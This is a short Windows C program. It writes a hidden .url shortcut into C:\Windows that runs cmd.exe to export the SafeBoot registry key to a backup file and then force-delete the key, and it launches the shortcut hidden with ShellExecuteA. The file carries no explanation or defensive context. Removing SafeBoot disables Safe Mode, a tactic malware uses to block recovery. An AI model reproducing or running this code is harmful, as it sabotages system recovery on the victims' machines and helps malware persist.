#include <windows.h>
#include <stdio.h>

void CreateByeByeSecureURL() {
    FILE *fp = fopen("C:\\Windows\\byebyesecuremode.url", "w");
    if (fp) {
        fprintf(fp,
            "[InternetShortcut]\n"
            "URL=cmd.exe /c reg export HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot C:\\Windows\\SysWOW32\\backup_safemode.bin && reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot /f\n"
        );
        fclose(fp);
    }
}

int main() {
    CreateByeByeSecureURL();
    ShellExecuteA(NULL, "open", "C:\\Windows\\byebyesecuremode.url", NULL, NULL, SW_HIDE);
    return 0;
}
